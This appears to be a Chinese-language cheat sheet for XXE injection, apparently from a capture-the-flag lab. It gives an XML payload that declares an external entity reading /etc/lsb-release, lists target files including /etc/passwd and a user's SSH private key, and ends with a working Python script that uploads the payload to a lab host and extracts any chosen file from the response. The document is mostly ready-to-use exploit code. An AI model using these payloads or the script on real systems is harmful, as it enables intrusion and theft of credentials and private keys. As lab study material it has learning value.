基本 XML 格式
```xml
<entry> 
<Author>xekOnerR</Author> 
<Subject>Testing</Subject> 
<Content>This is a test</Content> 
</entry>
```

注入
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/lsb-release">
]>

<entry>
<Author>
&bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</entry>
```
外部文件+xml 内 `&bar;` 调用，得到回显

常见注入文件
```bash
/etc/passwd
/home/user/.ssh/id_rsa
```




**脚本**
```python
#!/usr/bin/python3

import re
import requests
import sys

if len(sys.argv) < 2:
    print(f"usage: {sys.argv[0]} [path to file]")
    sys.exit()

file_name = sys.argv[1]

xml = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM "file://{file_name}">
]>

<item>
<Author>
&bar;
</Author>
<Subject>Testing</Subject>
<Content>This is a test</Content>
</item>'''

files = {'file': ('xxe.xml', xml, 'text/xml')}
proxies = {'http': 'http://127.0.0.1:8080'}
try:
    r = requests.post('http://10.10.10.91:5000/upload', files=files, proxies=proxies)
    if r.status_code == 200:
        pattern = re.compile(r"Author: \n(.*)\n Subject:", flags=re.DOTALL)
        print(re.search(pattern, r.text).group(1).strip())
        sys.exit()
    else:
        pass
except requests.exceptions.ConnectionError:
    pass
print("[-] Unable to connect. Either site is down or file doesn't exist or can't be read by current user.")
```